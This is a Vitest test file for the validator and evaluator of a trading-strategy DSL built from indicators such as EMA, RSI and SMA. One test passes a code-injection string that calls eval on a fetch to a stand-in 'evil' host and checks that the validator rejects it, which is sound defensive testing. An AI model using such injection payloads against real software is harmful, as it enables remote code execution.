import { describe, expect, it } from 'vitest';
import { evaluateDSL } from './evaluator';
import { STRATEGY_DSL_VERSION, type StrategyDSL } from './schema';
import { validateDSL } from './validator';

const good: StrategyDSL = {
  version: STRATEGY_DSL_VERSION,
  name: 'EMA cross + RSI filter',
  params: {
    emaFast: { type: 'int', min: 2, max: 50, default: 12 },
    emaSlow: { type: 'int', min: 10, max: 200, default: 50 },
    rsiBuy: { type: 'int', min: 10, max: 90, default: 40 },
  },
  entry: {
    op: 'AND',
    args: [
      { op: 'CROSS_UP', args: [
        { ind: 'EMA', src: 'CLOSE', len: '$emaFast' },
        { ind: 'EMA', src: 'CLOSE', len: '$emaSlow' },
      ] },
      { op: 'LT', args: [{ ind: 'RSI', src: 'CLOSE', len: 14 }, { op: 'CONST', v: '$rsiBuy' }] },
    ],
  },
  exit: {
    op: 'CROSS_DOWN',
    args: [
      { ind: 'EMA', src: 'CLOSE', len: '$emaFast' },
      { ind: 'EMA', src: 'CLOSE', len: '$emaSlow' },
    ],
  },
};

describe('validateDSL', () => {
  it('accepts a well-formed, typed strategy', () => {
    const result = validateDSL(good);
    expect(result.ok).toBe(true);
    expect(result.errors).toEqual([]);
    expect(result.maxLookbackBars).toBe(51);
  });

  it('rejects unknown operators, indicators, fields, and params', () => {
    const operator = structuredClone(good);
    (operator.entry as { op: string }).op = 'EXEC';
    expect(validateDSL(operator).ok).toBe(false);

    const indicator = structuredClone(good) as unknown as Record<string, unknown>;
    indicator.entry = { op: 'GT', args: [{ ind: 'MACD', src: 'CLOSE', len: 12 }, { op: 'CONST', v: 0 }] };
    expect(validateDSL(indicator).errors.some((error) => error.includes('not executable'))).toBe(true);

    const field = structuredClone(good) as unknown as Record<string, unknown>;
    (field.entry as Record<string, unknown>).danger = true;
    expect(validateDSL(field).ok).toBe(false);

    const reference = structuredClone(good);
    (reference.entry as { args: { args: { len: string }[] }[] }).args[0].args[0].len = '$missing';
    expect(validateDSL(reference).errors.some((error) => error.includes('unknown param'))).toBe(true);
  });

  it('rejects code-like strings and out-of-range lookbacks', () => {
    expect(validateDSL({ ...good, name: "x'); eval(fetch('//evil'))" }).errors.some((error) => error.includes('suspicious'))).toBe(true);
    const bad = structuredClone(good);
    (bad.exit as { args: { len: number }[] }).args[0].len = 9999;
    expect(validateDSL(bad).ok).toBe(false);
  });

  it('admits one-bar temporal offsets while indicator periods still start at two', () => {
    const temporal = structuredClone(good);
    temporal.entry = { op: 'RISING', args: [{ ind: 'CLOSE' }], n: 1 };
    temporal.exit = { op: 'SHIFT', args: [
      { op: 'GT', args: [{ ind: 'CLOSE' }, { op: 'CONST', v: 0 }] },
    ], n: 1 };
    expect(validateDSL(temporal).ok).toBe(true);

    const zeroOffset = structuredClone(temporal);
    (zeroOffset.entry as { n: number }).n = 0;
    expect(validateDSL(zeroOffset).errors).toContain('entry.n: lookback must be int in [1, 400]');

    const oneBarIndicator = structuredClone(good);
    (oneBarIndicator.exit as { args: { len: number }[] }).args[0].len = 1;
    expect(validateDSL(oneBarIndicator).errors)
      .toContain('exit.args[0].len: lookback must be int in [2, 400]');
  });

  it('enforces depth/node limits, exact arity, and expression types', () => {
    expect(validateDSL(good, { maxDepth: 8, maxNodes: 3, minLen: 2, maxLen: 400, maxConstAbs: 1e9 }).ok).toBe(false);
    const bad = structuredClone(good);
    bad.entry = { op: 'AND', args: [{ ind: 'CLOSE' }, { op: 'CONST', v: 1 }] };
    const result = validateDSL(bad);
    expect(result.errors).toContain('entry.args[0]: expected boolean, received number');
    expect(result.errors).toContain('entry.args[1]: expected boolean, received number');
  });

  it('rejects a non-boolean root', () => {
    const bad = structuredClone(good);
    bad.entry = { ind: 'CLOSE' };
    expect(validateDSL(bad).errors).toContain('entry: root must return boolean');
  });
});

describe('evaluateDSL', () => {
  it('evaluates parameterized cross trees deterministically', () => {
    const candles = [1, 2, 3, 2, 1, 2, 3, 4].map((close, index) => ({
      t: index * 60_000,
      o: close,
      h: close + 0.5,
      l: close - 0.5,
      c: close,
      v: 100 + index,
    }));
    const dsl: StrategyDSL = {
      version: STRATEGY_DSL_VERSION,
      name: 'SMA cross',
      params: { fast: 2, slow: { type: 'int', min: 3, max: 10, default: 3 } },
      entry: {
        op: 'CROSS_UP',
        args: [
          { ind: 'SMA', src: 'CLOSE', len: '$fast' },
          { ind: 'SMA', src: 'CLOSE', len: '$slow' },
        ],
      },
      exit: {
        op: 'CROSS_DOWN',
        args: [
          { ind: 'SMA', src: 'CLOSE', len: '$fast' },
          { ind: 'SMA', src: 'CLOSE', len: '$slow' },
        ],
      },
    };
    const first = evaluateDSL(candles, dsl);
    expect(first).toEqual(evaluateDSL(candles, dsl));
    expect(first.signals.entry).toEqual([false, false, false, false, false, false, true, false]);
    expect(first.signals.exit).toEqual([false, false, false, false, true, false, false, false]);
    expect(first.maxLookbackBars).toBe(4);
  });

  it('refuses evaluation when validation fails', () => {
    const invalid = { ...good, entry: { op: 'DIV', args: [{ ind: 'CLOSE' }, { op: 'CONST', v: 0 }] } };
    expect(() => evaluateDSL([], invalid)).toThrow(/root must return boolean/);
  });
});
